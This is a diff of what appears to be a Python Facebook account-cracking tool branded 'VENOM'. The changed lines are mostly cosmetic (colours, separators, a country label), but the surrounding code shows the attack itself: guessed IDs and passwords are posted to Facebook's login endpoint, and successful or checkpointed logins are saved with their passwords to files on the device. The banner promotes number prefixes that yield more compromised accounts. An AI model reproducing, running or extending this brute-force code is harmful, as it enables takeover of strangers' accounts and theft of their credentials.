@@ -85,9 +85,9 @@ logo = ("""
 \033[1;96m=================================
 \033[1;92m Owner  : MR ✓ VENOM :/
 \033[1;92m GitHub : Mrvenom01 :/
-\033[1;95m Version:\033[1;92m 1.0 \033[1;93m:/
-\033[1;95m Status : Free :/
-\033[1;91m Notice : Use 10007/10006 For More OK Ids :/
+\033[1;97m Version:\033[1;92m 1.0 \033[1;93m:/
+\033[1;92m Status : Free :/
+\033[1;92m Notice : Use 10007/10006 For More OK Ids :/
 \033[1;93m=================================""")
 
 
@@ -188,7 +188,7 @@ def gmail():
 
        
         
-####@-----PakNumber-----@####
+####@-----BDNumber-----@####
 
 
 def pak():
@@ -264,7 +264,7 @@ def method():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait If You Can :)")
-    print(f"{oo('•')}/sdcard/VNM-OK.txt")
+    print(f"{oo('×')}/sdcard/VNM-OK.txt")
     print('\033[1;93m='*25)
     print()
     
@@ -292,8 +292,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mVENOM-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/VNM-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mVENOM-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m×\033[1;97m '+pword+'  ')
+                open('/sdcard/VNM-OK.txt','a').write(f'{acc} × {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -306,9 +306,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m×\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/VNM-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/VNM-CP.txt','a').write(f'{acc} × {pword}\n')
                 break
             else:
                 continue
@@ -341,8 +341,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/VNM-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m×\033[1;97m '+pword+'  ')
+                open('/sdcard/VNM-OK.txt','a').write(f'{acc} × {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -358,9 +358,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mVNM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mVNM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m×\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/VNM-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/VNM-CP.txt','a').write(f'{acc} × {pword}\n')
                 break
             else:
                 continue
@@ -412,7 +412,7 @@ def andom():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait If You Can :)")
-    print(f"{oo('•')}/sdcard/VNM-OK.txt")
+    print(f"{oo('×')}/sdcard/VNM-OK.txt")
     print('\033[1;93m='*25)
     print()    
     def start(user):
@@ -439,8 +439,8 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/VNM-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m×\033[1;97m '+pword+'  ')
+                open('/sdcard/VNM-OK.txt','a').write(f'{acc} × {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -453,9 +453,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;92mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m×\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/VNM-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/VNM-CP.txt','a').write(f'{acc} × {pword}\n')
                 break
             else:
                 continue
@@ -489,8 +489,8 @@ def andom():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/VNM-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mVENOM😘-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m×\033[1;97m '+pword+'  ')
+                open('/sdcard/VNM-OK.txt','a').write(f'{acc} × {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -506,9 +506,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mVENOM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m×\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/VNM-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/VNM-CP.txt','a').write(f'{acc} × {pword}\n')
                 break
             else:
                 continue
